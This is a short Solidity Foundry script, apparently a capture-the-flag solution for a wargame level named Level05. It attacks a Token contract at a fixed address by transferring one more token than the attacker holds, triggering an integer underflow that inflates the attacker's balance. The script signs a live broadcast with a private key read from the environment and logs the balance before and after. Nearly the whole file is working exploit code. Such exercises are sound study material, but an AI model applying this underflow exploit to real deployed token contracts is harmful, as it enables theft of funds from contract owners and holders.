pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;
import "../instances/Ilevel05.sol";
import "forge-std/Test.sol";

contract Level05 is Test {
    Token token = Token(0xEDBDF05F466C298D4eDAD43f2636f434EeDAe914);

    function test() external {
        uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY");
        address attacker = vm.addr(attackerPrivateKey);
        vm.startBroadcast(attackerPrivateKey);
        console.log("Current balance: ", token.balanceOf(attacker));
        token.transfer(address(token), token.balanceOf(attacker) + 1);
        console.log("After attack balance: ", token.balanceOf(attacker));
        vm.stopBroadcast();
    }
}
